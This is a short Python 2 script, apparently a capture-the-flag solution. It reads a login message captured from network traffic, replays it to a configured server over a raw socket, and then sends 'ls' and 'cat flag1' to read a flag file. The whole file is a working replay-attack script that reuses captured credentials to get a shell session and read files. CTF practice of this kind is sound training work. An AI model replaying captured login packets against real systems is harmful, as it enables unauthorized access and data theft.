import socket
import config


def main():
    # get the login info, which is extracted from the packet
    f = open('data/msg.txt', 'r')
    msg = f.read()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (config.HOST, config.PORT)
    print 'connecting to %s port %s' % server_address
    sock.connect(server_address)

    sock.sendall(msg)  # replay login message
    sock.sendall('ls\r\n')  # to list the file
    sock.sendall('cat flag1\r\n')  # to get flag1

    # send login
    while True:
        data = sock.recv(1024)
        if data:
            print data

    print 'Close the socket!'
    sock.close()

if __name__ == '__main__':
    main()
